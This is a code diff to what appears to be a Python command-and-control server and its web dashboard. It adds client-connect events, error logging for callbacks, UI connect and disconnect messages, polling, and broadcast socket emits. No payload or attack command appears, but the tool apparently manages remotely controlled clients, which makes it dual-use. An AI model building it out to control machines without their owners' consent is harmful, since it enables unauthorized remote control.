@@ -98,6 +98,7 @@ class CNCServer:
                 session = ClientSession(id=cid, sock=client_sock, address=addr)
                 self.clients[cid] = session
             print(f"[cnc] New client #{cid} from {addr[0]}:{addr[1]}")
+            self._emit_event("client_connected", {"id": cid, "address": addr})
             threading.Thread(
                 target=self._client_reader, args=(session,), daemon=True
             ).start()
@@ -141,8 +142,8 @@ class CNCServer:
         for callback in self._event_callbacks:
             try:
                 callback(event_type, data)
-            except Exception:
-                pass
+            except Exception as e:
+                print(f"[cnc] Error in event callback: {e}")
 
     def register_event_callback(self, callback: Callable[[str, JsonDict], None]) -> None:
         """Register a callback for server events."""
@@ -435,16 +436,28 @@ def run_web(server: CNCServer, web_host: str, web_port: int) -> None:
         });
 
         socket.on('clients_update', (data) => {
+            const oldCount = Object.keys(clients).length;
             clients = {};
             data.clients.forEach(client => {
                 clients[client.id] = client;
             });
+            const newCount = Object.keys(clients).length;
+            if (newCount > oldCount) {
+                addOutput(`[System] Client connected. Total clients: ${newCount}`);
+            } else if (newCount < oldCount) {
+                addOutput(`[System] Client disconnected. Total clients: ${newCount}`);
+            }
             updateClientsList();
         });
 
         socket.on('client_response', (data) => {
             addOutput(`[Client #${data.id}] ${JSON.stringify(data.response, null, 2)}`);
         });
+
+        // Periodic refresh as fallback
+        setInterval(() => {
+            socket.emit('get_clients');
+        }, 2000);
 
         socket.on('command_result', (data) => {
             if (data.success) {
@@ -591,13 +604,22 @@ def run_web(server: CNCServer, web_host: str, web_port: int) -> None:
                     'info': session.info,
                     'alive': session.alive
                 })
-        socketio.emit('clients_update', {'clients': clients_data})
+        # Emit from background thread - use app context and broadcast to all clients
+        try:
+            with app.app_context():
+                socketio.emit('clients_update', {'clients': clients_data}, broadcast=True, namespace='/')
+        except Exception as e:
+            print(f"[cnc] Error emitting clients_update: {e}")
 
     def on_event(event_type: str, data: JsonDict):
-        if event_type in ('client_hello', 'client_disconnected', 'client_removed', 'client_response'):
+        if event_type in ('client_connected', 'client_hello', 'client_disconnected', 'client_removed', 'client_response'):
             emit_clients_update()
         if event_type == 'client_response':
-            socketio.emit('client_response', data)
+            try:
+                with app.app_context():
+                    socketio.emit('client_response', data, broadcast=True, namespace='/')
+            except Exception as e:
+                print(f"[cnc] Error emitting client_response: {e}")
 
     server.register_event_callback(on_event)
 
